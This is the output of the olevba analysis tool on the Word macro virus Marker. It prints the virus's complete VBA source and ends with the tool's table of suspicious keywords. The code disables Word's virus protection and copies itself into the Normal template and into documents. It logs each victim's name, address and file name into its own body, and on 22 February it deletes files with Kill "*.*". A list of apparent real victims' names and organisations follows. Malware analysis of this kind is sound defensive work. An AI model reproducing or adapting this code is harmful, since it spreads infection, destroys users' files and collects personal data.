olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-1a38c44c6e2a35e430d24c75feb12b6477b205b8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-1a38c44c6e2a35e430d24c75feb12b6477b205b8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Close()

On Error Resume Next

Const Murder = "<-- Its Murder!!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim rep As Integer
Dim virusCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.codemodule.Find(Murder, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.codemodule.Find(Murder, 1, 1, 10000, 10000)

'Switch the VirusProtection OFF
Options.VirusProtection = False
Options.SaveNormalPrompt = False



'PayLoad
Delivery:
If Day(Now()) = 22 And Month(Now()) = 2 Then
       Kill "*.*":
       rep = MsgBox("That's Right", vbOK + vbCritical, "It's Murder")
       GoTo Delivery
       End If
       
'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   


'.......................................................................................
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
  virusCode = ad.codemodule.Lines(1, ad.codemodule.countoflines)
    'Write a log file of this NormalTemplate infection
    For I = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, I, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, I, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, I, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next I

    LogData = Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM -") & _
                     Format(Date, "dddd,d mmm,yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & Application.UserAddress & Chr(13) & _
              "' " & Application.ActiveDocument & Chr(13)
              
              
    virusCode = virusCode & LogData
   

    nt.codemodule.DeleteLines 1, nt.codemodule.countoflines
    nt.codemodule.AddFromString virusCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
 
End If



'..........................................................................................
  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    virusCode = nt.codemodule.Lines(1, nt.codemodule.countoflines)

    ad.codemodule.DeleteLines 1, ad.codemodule.countoflines
    ad.codemodule.AddFromString virusCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    End If



End Sub


' Potential Murder Victims  "Marked for death...If I kiss you now, you'll probably die later..."
'

' 12:00:00 AM -Thursday,6 May,1999
' Ryde or Die
' The world
' ThE GeNiUs.doc

' 06:27:03 PM -Thursday,6 May,1999
' Valued Gateway Customer
'
' 1st Trial.doc



' 10:10:56 AM -Friday,7 May,1999
' Valued Gateway Customer
'
' 1st Trial.doc



' 02:33:34 PM -Saturday,8 May,1999
' Matthew E. Dawson
'
' Psychology paper.doc



' 08:17:21 PM -Wednesday,12 May,1999
' administrator
'
' str.doc



' 02:53:16 PM -Thursday,13 May,1999
' John C. Carrington
'
' OPS4_ROY_REL.doc



' 09:32:48 AM -Monday,17 May,1999
' Obrienw
'
' Amara.doc



' 08:37:56 AM -Friday,21 May,1999
' CARLSOAF
'
' Randy.doc



' 12:49:55 PM -Tuesday,1 Jun,1999
' Raytheon Systems Company
'
' Casual Dress.doc


' 10:10:34  -Dienstag,24 Jul,2001
' Andreas Marx
'
' NORMAL.DOC



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

